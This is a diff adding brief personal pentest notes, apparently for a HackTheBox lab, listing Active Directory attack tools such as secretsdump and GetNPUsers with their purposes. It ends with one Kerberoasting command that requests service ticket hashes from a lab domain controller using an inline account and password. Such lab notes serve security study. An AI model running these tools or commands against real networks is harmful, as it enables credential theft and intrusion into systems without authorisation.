@@ -1,0 +1,21 @@
+tools
+
+lookupsid.py  -- to get usernames
+
+zap
+
+smbclient
+
+smbmap -- for permisions anon
+
+GetNPUsers.py -- to get passwords
+
+evil-winrm -- to login using creds
+
+secretsdump.py -- to get all hashes
+
+when port 88 kerberos GetUserSPNs.py  -- to get pass word hash     ---
+
+```
+./GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18
+```
